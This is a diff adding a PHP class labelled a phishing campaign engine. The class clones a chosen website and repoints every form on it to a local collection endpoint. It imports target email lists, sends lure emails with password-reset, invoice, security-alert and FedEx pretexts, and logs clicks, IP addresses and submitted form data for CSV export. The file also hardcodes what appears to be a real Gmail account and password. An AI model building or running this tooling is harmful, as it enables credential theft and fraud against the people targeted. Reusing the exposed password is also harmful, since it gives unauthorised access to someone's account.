@@ -1,0 +1,586 @@
+<?php
+require_once dirname(__DIR__, 3) . "/vendor/autoload.php";
+/**
+ * COSMIC PHISHING CAMPAIGN ENGINE v4.0 – MASTER EDITION WITH PHPMailer
+ * Full email sending via SMTP, database logging, and professional error handling.
+ */
+
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+class PhishingCampaign {
+    private $db;
+    private $campaignsDir;
+    private $dbPath;
+    private $config;
+
+    /**
+     * Constructor.
+     * @param array $config Configuration options (data_dir, public_dir, smtp, etc.)
+     */
+    public function __construct($config = []) {
+        $this->config = array_merge([
+            'data_dir'       => dirname(__DIR__, 2) . '/data/phishing/',
+            'public_dir'     => dirname(__DIR__, 2) . '/public/phishing/',
+            'smtp_host'      => 'smtp.gmail.com',
+            'smtp_port'      => 587,
+            'smtp_user'      => 'spiralsourcetechlaws@gmail.com',
+            'smtp_pass'      => 'AruEshAru@8888',
+            'smtp_encryption' => 'tls',
+            'from_email'     => 'noreply@cosmic.local',
+            'from_name'      => 'COSMIC Phishing',
+            'enable_email'   => true
+        ], $config);
+
+        $this->campaignsDir = rtrim($this->config['data_dir'], '/') . '/';
+        if (!is_dir($this->campaignsDir)) {
+            if (!mkdir($this->campaignsDir, 0755, true)) {
+                throw new RuntimeException("Cannot create campaigns directory: {$this->campaignsDir}");
+            }
+        }
+        $this->dbPath = $this->campaignsDir . 'campaigns.db';
+        $this->initDB();
+    }
+
+    private function initDB() {
+        if (!class_exists('SQLite3')) {
+            throw new RuntimeException("SQLite3 extension not loaded.");
+        }
+
+        try {
+            $this->db = new SQLite3($this->dbPath);
+            $this->db->busyTimeout(5000);
+            $this->db->exec('PRAGMA foreign_keys = ON;');
+            $this->db->exec('PRAGMA journal_mode = WAL;');
+
+            $this->db->exec("CREATE TABLE IF NOT EXISTS campaigns (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                name TEXT UNIQUE,
+                target_url TEXT,
+                clone_path TEXT,
+                status TEXT DEFAULT 'draft',
+                created_at INTEGER,
+                launched_at INTEGER,
+                clicks INTEGER DEFAULT 0,
+                submissions INTEGER DEFAULT 0,
+                emails_sent INTEGER DEFAULT 0,
+                email_template TEXT,
+                smtp_config TEXT
+            )");
+
+            $this->db->exec("CREATE TABLE IF NOT EXISTS targets (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                campaign_id INTEGER,
+                email TEXT,
+                name TEXT,
+                clicked INTEGER DEFAULT 0,
+                submitted INTEGER DEFAULT 0,
+                user_agent TEXT,
+                ip TEXT,
+                first_seen INTEGER,
+                last_seen INTEGER,
+                data TEXT
+            )");
+
+            $this->db->exec("CREATE TABLE IF NOT EXISTS emails (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                campaign_id INTEGER,
+                target_id INTEGER,
+                sent_at INTEGER,
+                opened INTEGER DEFAULT 0,
+                opened_at INTEGER
+            )");
+
+            // Indexes
+            $this->db->exec("CREATE INDEX IF NOT EXISTS idx_targets_campaign ON targets(campaign_id)");
+            $this->db->exec("CREATE INDEX IF NOT EXISTS idx_targets_email ON targets(email)");
+            $this->db->exec("CREATE INDEX IF NOT EXISTS idx_emails_campaign ON emails(campaign_id)");
+            $this->db->exec("CREATE INDEX IF NOT EXISTS idx_emails_target ON emails(target_id)");
+
+            $this->migrate();
+
+        } catch (Exception $e) {
+            throw new RuntimeException("Database initialization failed: " . $e->getMessage());
+        }
+    }
+
+    private function migrate() {
+        $columns = $this->getTableColumns('campaigns');
+        if (!in_array('status', $columns)) {
+            $this->db->exec("ALTER TABLE campaigns ADD COLUMN status TEXT DEFAULT 'draft'");
+        }
+        if (!in_array('launched_at', $columns)) {
+            $this->db->exec("ALTER TABLE campaigns ADD COLUMN launched_at INTEGER");
+        }
+        if (!in_array('email_template', $columns)) {
+            $this->db->exec("ALTER TABLE campaigns ADD COLUMN email_template TEXT");
+        }
+        if (!in_array('smtp_config', $columns)) {
+            $this->db->exec("ALTER TABLE campaigns ADD COLUMN smtp_config TEXT");
+        }
+
+        $columns = $this->getTableColumns('targets');
+        if (!in_array('data', $columns)) {
+            $this->db->exec("ALTER TABLE targets ADD COLUMN data TEXT");
+        }
+        if (!in_array('first_seen', $columns)) {
+            $this->db->exec("ALTER TABLE targets ADD COLUMN first_seen INTEGER");
+        }
+        if (!in_array('last_seen', $columns)) {
+            $this->db->exec("ALTER TABLE targets ADD COLUMN last_seen INTEGER");
+        }
+
+        $columns = $this->getTableColumns('emails');
+        if (!in_array('opened', $columns)) {
+            $this->db->exec("ALTER TABLE emails ADD COLUMN opened INTEGER DEFAULT 0");
+        }
+        if (!in_array('opened_at', $columns)) {
+            $this->db->exec("ALTER TABLE emails ADD COLUMN opened_at INTEGER");
+        }
+    }
+
+    private function getTableColumns($table) {
+        $result = $this->db->query("PRAGMA table_info($table)");
+        $columns = [];
+        while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
+            $columns[] = $row['name'];
+        }
+        return $columns;
+    }
+
+    public function createCampaign($name, $targetUrl, $emailTemplate = '') {
+        if (!filter_var($targetUrl, FILTER_VALIDATE_URL)) {
+            throw new InvalidArgumentException("Invalid target URL.");
+        }
+        $stmt = $this->db->prepare("INSERT INTO campaigns (name, target_url, email_template, status, created_at) VALUES (:name, :url, :template, 'draft', :time)");
+        if (!$stmt) {
+            throw new RuntimeException("Prepare failed: " . $this->db->lastErrorMsg());
+        }
+        $stmt->bindValue(':name', $name, SQLITE3_TEXT);
+        $stmt->bindValue(':url', $targetUrl, SQLITE3_TEXT);
+        $stmt->bindValue(':template', $emailTemplate, SQLITE3_TEXT);
+        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+        if (!$stmt->execute()) {
+            throw new RuntimeException("Failed to create campaign: " . $this->db->lastErrorMsg());
+        }
+        return $this->db->lastInsertRowID();
+    }
+
+    public function clonePage($campaignId, $url = null) {
+        $campaign = $this->getCampaign($campaignId);
+        if (!$campaign) {
+            throw new InvalidArgumentException("Campaign not found.");
+        }
+        $url = $url ?: $campaign['target_url'];
+
+        $html = $this->fetchUrl($url);
+        if ($html === false) {
+            throw new RuntimeException("Failed to fetch URL: $url");
+        }
+
+        $dom = new DOMDocument();
+        libxml_use_internal_errors(true);
+        $dom->loadHTML($html, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
+        libxml_clear_errors();
+
+        $forms = $dom->getElementsByTagName('form');
+        foreach ($forms as $form) {
+            $form->setAttribute('action', '/phishing/collect?campaign=' . $campaignId);
+            $form->setAttribute('method', 'post');
+        }
+
+        $html = $dom->saveHTML();
+
+        $publicBase = rtrim($this->config['public_dir'], '/') . '/pages/';
+        if (!is_dir($publicBase) && !mkdir($publicBase, 0755, true)) {
+            throw new RuntimeException("Failed to create public pages directory: $publicBase");
+        }
+
+        $cloneDir = $publicBase . preg_replace('/[^a-z0-9_-]/i', '_', $campaign['name']) . '/';
+        if (!is_dir($cloneDir) && !mkdir($cloneDir, 0755, true)) {
+            throw new RuntimeException("Failed to create clone directory: $cloneDir");
+        }
+        $clonePath = $cloneDir . 'index.html';
+        if (file_put_contents($clonePath, $html) === false) {
+            throw new RuntimeException("Failed to write clone file: $clonePath");
+        }
+
+        $publicPath = '/phishing/pages/' . basename($cloneDir) . '/';
+
+        $stmt = $this->db->prepare("UPDATE campaigns SET clone_path = :path, target_url = :url WHERE id = :id");
+        if (!$stmt) {
+            throw new RuntimeException("Prepare failed: " . $this->db->lastErrorMsg());
+        }
+        $stmt->bindValue(':path', $publicPath, SQLITE3_TEXT);
+        $stmt->bindValue(':url', $url, SQLITE3_TEXT);
+        $stmt->bindValue(':id', $campaignId, SQLITE3_INTEGER);
+        $stmt->execute();
+
+        return $publicPath;
+    }
+
+    private function fetchUrl($url) {
+        if (function_exists('curl_init')) {
+            $ch = curl_init($url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+            $html = curl_exec($ch);
+            $error = curl_error($ch);
+            curl_close($ch);
+            if ($html === false) {
+                error_log("cURL error: $error");
+                return false;
+            }
+            return $html;
+        } else {
+            $opts = [
+                'http' => [
+                    'method' => 'GET',
+                    'header' => "User-Agent: Mozilla/5.0\r\n",
+                    'timeout' => 15
+                ],
+                'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
+            ];
+            return @file_get_contents($url, false, stream_context_create($opts));
+        }
+    }
+
+    public function importTargets($campaignId, $targets) {
+        $count = 0;
+        $stmt = $this->db->prepare("INSERT OR IGNORE INTO targets (campaign_id, email, name) VALUES (:cid, :email, :name)");
+        if (!$stmt) {
+            throw new RuntimeException("Prepare failed: " . $this->db->lastErrorMsg());
+        }
+        foreach ($targets as $t) {
+            if (!filter_var($t['email'], FILTER_VALIDATE_EMAIL)) {
+                continue;
+            }
+            $stmt->clear();
+            $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+            $stmt->bindValue(':email', $t['email'], SQLITE3_TEXT);
+            $stmt->bindValue(':name', $t['name'] ?? '', SQLITE3_TEXT);
+            if ($stmt->execute()) {
+                $count++;
+            }
+        }
+        return $count;
+    }
+
+    public function generateEmailTemplate($type, $campaignName, $phishingLink) {
+        $templates = [
+            'password_reset' => "Subject: Password Expiry Notice\n\nDear {name},\n\nYour password for {campaign} will expire in 24 hours. Please reset it immediately: {link}\n\nIT Support",
+            'invoice' => "Subject: Invoice #{rand}\n\nDear {name},\n\nPlease find attached invoice #{rand}. Click to view: {link}\n\nFinance Dept",
+            'security_alert' => "Subject: Security Alert\n\nDear {name},\n\nWe detected unusual activity on your account. Verify now: {link}\n\nSecurity Team",
+            'newsletter' => "Subject: Exclusive Offer\n\nHi {name},\n\nCheck out our latest news: {link}\n\nMarketing",
+            'fedex' => "Subject: Package Delivery\n\nDear {name},\n\nYour package is waiting. Schedule delivery: {link}\n\nFedEx"
+        ];
+        $template = $templates[$type] ?? $templates['security_alert'];
+        $template = str_replace('{campaign}', $campaignName, $template);
+        $template = str_replace('{link}', $phishingLink, $template);
+        $template = str_replace('{rand}', rand(1000,9999), $template);
+        return $template;
+    }
+
+    /**
+     * Send emails using PHPMailer.
+     */
+    public function sendEmails($campaignId, $smtpConfig = null) {
+        if (!$this->config['enable_email']) {
+            error_log("Email sending disabled. Would send emails for campaign $campaignId.");
+            return 0;
+        }
+
+        $targets = $this->getTargets($campaignId);
+        $campaign = $this->getCampaign($campaignId);
+        if (!$campaign) {
+            throw new InvalidArgumentException("Campaign not found.");
+        }
+
+        $linkBase = $this->getBaseUrl() . $campaign['clone_path'];
+        $sent = 0;
+
+        $mailer = $this->getMailer($smtpConfig ?: $this->config);
+
+        foreach ($targets as $target) {
+            $trackingLink = $linkBase . '?email=' . urlencode($target['email']);
+            $emailBody = str_replace(['{name}', '{link}'], [$target['name'], $trackingLink], $campaign['email_template']);
+            $subject = $this->extractSubject($emailBody);
+            // Remove Subject line from body
+            $body = preg_replace('/^Subject:.*\n\n?/', '', $emailBody);
+
+            try {
+                $mailer->clearAddresses();
+                $mailer->addAddress($target['email'], $target['name']);
+                $mailer->Subject = $subject;
+                $mailer->Body = $body;
+                $mailer->send();
+
+                // Log sent email
+                $stmt = $this->db->prepare("INSERT INTO emails (campaign_id, target_id, sent_at) VALUES (:cid, :tid, :time)");
+                if (!$stmt) continue;
+                $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+                $stmt->bindValue(':tid', $target['id'], SQLITE3_INTEGER);
+                $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+                $stmt->execute();
+                $sent++;
+            } catch (Exception $e) {
+                error_log("Failed to send to {$target['email']}: " . $e->getMessage());
+            }
+        }
+
+        $stmt = $this->db->prepare("UPDATE campaigns SET emails_sent = emails_sent + :sent, launched_at = :time WHERE id = :id");
+        if ($stmt) {
+            $stmt->bindValue(':sent', $sent, SQLITE3_INTEGER);
+            $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+            $stmt->bindValue(':id', $campaignId, SQLITE3_INTEGER);
+            $stmt->execute();
+        }
+
+        return $sent;
+    }
+
+    private function getBaseUrl() {
+        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+        $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
+        return $protocol . '://' . $host;
+    }
+
+    /**
+     * Create PHPMailer instance with SMTP configuration.
+     */
+    private function getMailer($config) {
+        $mail = new PHPMailer(true);
+        try {
+            $mail->isSMTP();
+            $mail->Host       = $config['smtp_host'];
+            $mail->SMTPAuth   = true;
+            $mail->Username   = $config['smtp_user'];
+            $mail->Password   = $config['smtp_pass'];
+            $mail->SMTPSecure = $config['smtp_encryption'];
+            $mail->Port       = $config['smtp_port'];
+            $mail->setFrom($config['from_email'], $config['from_name']);
+            $mail->isHTML(false);
+            $mail->CharSet = 'UTF-8';
+        } catch (Exception $e) {
+            error_log("PHPMailer configuration error: " . $e->getMessage());
+            throw new RuntimeException("SMTP configuration error: " . $e->getMessage());
+        }
+        return $mail;
+    }
+
+    private function extractSubject($body) {
+        if (preg_match('/^Subject:\s*(.+)$/m', $body, $matches)) {
+            return trim($matches[1]);
+        }
+        return 'No Subject';
+    }
+
+    public function logClick($campaignId, $targetEmail, $ip, $ua) {
+        $target = $this->getTargetByEmail($campaignId, $targetEmail);
+        if ($target) {
+            $stmt = $this->db->prepare("UPDATE targets SET clicked = 1, ip = :ip, user_agent = :ua, first_seen = :time WHERE id = :tid");
+            if ($stmt) {
+                $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
+                $stmt->bindValue(':ua', $ua, SQLITE3_TEXT);
+                $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+                $stmt->bindValue(':tid', $target['id'], SQLITE3_INTEGER);
+                $stmt->execute();
+            }
+            $stmt = $this->db->prepare("UPDATE campaigns SET clicks = clicks + 1 WHERE id = :cid");
+            if ($stmt) {
+                $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+                $stmt->execute();
+            }
+        }
+    }
+
+    public function logSubmission($campaignId, $targetEmail, $data) {
+        $target = $this->getTargetByEmail($campaignId, $targetEmail);
+        if ($target) {
+            $stmt = $this->db->prepare("UPDATE targets SET submitted = 1, data = :data, last_seen = :time WHERE id = :tid");
+            if ($stmt) {
+                $stmt->bindValue(':data', json_encode($data), SQLITE3_TEXT);
+                $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+                $stmt->bindValue(':tid', $target['id'], SQLITE3_INTEGER);
+                $stmt->execute();
+            }
+            $stmt = $this->db->prepare("UPDATE campaigns SET submissions = submissions + 1 WHERE id = :cid");
+            if ($stmt) {
+                $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+                $stmt->execute();
+            }
+        }
+    }
+
+    private function getTargetByEmail($campaignId, $email) {
+        $stmt = $this->db->prepare("SELECT id FROM targets WHERE campaign_id = :cid AND email = :email");
+        if (!$stmt) return null;
+        $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+        $stmt->bindValue(':email', $email, SQLITE3_TEXT);
+        $res = $stmt->execute();
+        return $res->fetchArray(SQLITE3_ASSOC);
+    }
+
+    public function getCampaign($id) {
+        $stmt = $this->db->prepare("SELECT * FROM campaigns WHERE id = :id");
+        if (!$stmt) return null;
+        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
+        $res = $stmt->execute();
+        return $res->fetchArray(SQLITE3_ASSOC);
+    }
+
+    public function getCampaigns() {
+        $res = $this->db->query("SELECT * FROM campaigns ORDER BY created_at DESC");
+        $out = [];
+        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $out[] = $row;
+        return $out;
+    }
+
+    public function getTargets($campaignId, $limit = 1000, $offset = 0) {
+        $stmt = $this->db->prepare("SELECT * FROM targets WHERE campaign_id = :cid ORDER BY id LIMIT :limit OFFSET :offset");
+        if (!$stmt) return [];
+        $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+        $stmt->bindValue(':limit', $limit, SQLITE3_INTEGER);
+        $stmt->bindValue(':offset', $offset, SQLITE3_INTEGER);
+        $res = $stmt->execute();
+        $out = [];
+        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $out[] = $row;
+        return $out;
+    }
+
+    public function getStats($campaignId) {
+        $campaign = $this->getCampaign($campaignId);
+        if (!$campaign) return null;
+
+        $stmt = $this->db->prepare("SELECT COUNT(*) FROM targets WHERE campaign_id = :cid");
+        if (!$stmt) return null;
+        $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+        $total = $stmt->execute()->fetchArray(SQLITE3_NUM)[0];
+
+        return [
+            'campaign' => $campaign,
+            'targets_total' => $total,
+            'clicks' => $campaign['clicks'],
+            'submissions' => $campaign['submissions'],
+            'emails_sent' => $campaign['emails_sent']
+        ];
+    }
+
+    public function deleteCampaign($campaignId) {
+        $this->db->exec("BEGIN TRANSACTION");
+        try {
+            $stmt = $this->db->prepare("DELETE FROM emails WHERE campaign_id = :cid");
+            if ($stmt) {
+                $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+                $stmt->execute();
+            }
+            $stmt = $this->db->prepare("DELETE FROM targets WHERE campaign_id = :cid");
+            if ($stmt) {
+                $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+                $stmt->execute();
+            }
+            $stmt = $this->db->prepare("DELETE FROM campaigns WHERE id = :cid");
+            if ($stmt) {
+                $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+                $stmt->execute();
+            }
+            $this->db->exec("COMMIT");
+        } catch (Exception $e) {
+            $this->db->exec("ROLLBACK");
+            throw $e;
+        }
+    }
+
+    public function exportResults($campaignId) {
+        $targets = $this->getTargets($campaignId, 100000);
+        $output = fopen('php://temp', 'w');
+        fputcsv($output, ['Email', 'Name', 'Clicked', 'Submitted', 'IP', 'User Agent', 'First Seen', 'Last Seen', 'Data']);
+        foreach ($targets as $t) {
+            fputcsv($output, [
+                $t['email'],
+                $t['name'],
+                $t['clicked'],
+                $t['submitted'],
+                $t['ip'],
+                $t['user_agent'],
+                $t['first_seen'] ? date('Y-m-d H:i:s', $t['first_seen']) : '',
+                $t['last_seen'] ? date('Y-m-d H:i:s', $t['last_seen']) : '',
+                $t['data']
+            ]);
+        }
+        rewind($output);
+        $csv = stream_get_contents($output);
+        fclose($output);
+        return $csv;
+    }
+
+    public function useTemplate($campaignId, $templateName) {
+        $campaign = $this->getCampaign($campaignId);
+        if (!$campaign) {
+            throw new InvalidArgumentException("Campaign not found.");
+        }
+
+        $templateFile = dirname(__DIR__, 2) . '/system/templates/phishing/' . $templateName;
+        if (!file_exists($templateFile)) {
+            throw new RuntimeException("Template file not found: $templateFile");
+        }
+
+        $html = file_get_contents($templateFile);
+        if ($html === false) {
+            throw new RuntimeException("Failed to read template file: $templateFile");
+        }
+
+        $dom = new DOMDocument();
+        libxml_use_internal_errors(true);
+        $dom->loadHTML($html, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
+        libxml_clear_errors();
+
+        $forms = $dom->getElementsByTagName('form');
+        foreach ($forms as $form) {
+            $form->setAttribute('action', '/phishing/collect?campaign=' . $campaignId);
+            $form->setAttribute('method', 'post');
+        }
+
+        $html = $dom->saveHTML();
+
+        $publicBase = rtrim($this->config['public_dir'], '/') . '/pages/';
+        if (!is_dir($publicBase) && !mkdir($publicBase, 0755, true)) {
+            throw new RuntimeException("Failed to create public pages directory: $publicBase");
+        }
+
+        $cloneDir = $publicBase . preg_replace('/[^a-z0-9_-]/i', '_', $campaign['name']) . '/';
+        if (!is_dir($cloneDir) && !mkdir($cloneDir, 0755, true)) {
+            throw new RuntimeException("Failed to create clone directory: $cloneDir");
+        }
+        $clonePath = $cloneDir . 'index.html';
+        if (file_put_contents($clonePath, $html) === false) {
+            throw new RuntimeException("Failed to write clone file: $clonePath");
+        }
+
+        $publicPath = '/phishing/pages/' . basename($cloneDir) . '/';
+
+        $stmt = $this->db->prepare("UPDATE campaigns SET clone_path = :path WHERE id = :id");
+        if (!$stmt) {
+            throw new RuntimeException("Prepare failed: " . $this->db->lastErrorMsg());
+        }
+        $stmt->bindValue(':path', $publicPath, SQLITE3_TEXT);
+        $stmt->bindValue(':id', $campaignId, SQLITE3_INTEGER);
+        $stmt->execute();
+
+        return $publicPath;
+    }
+
+    public function updateEmailTemplate($campaignId, $template) {
+        $stmt = $this->db->prepare("UPDATE campaigns SET email_template = :tmpl WHERE id = :id");
+        if (!$stmt) {
+            error_log("Failed to prepare updateEmailTemplate: " . $this->db->lastErrorMsg());
+            return false;
+        }
+        $stmt->bindValue(':tmpl', $template, SQLITE3_TEXT);
+        $stmt->bindValue(':id', $campaignId, SQLITE3_INTEGER);
+        return $stmt->execute() ? true : false;
+    }
+}
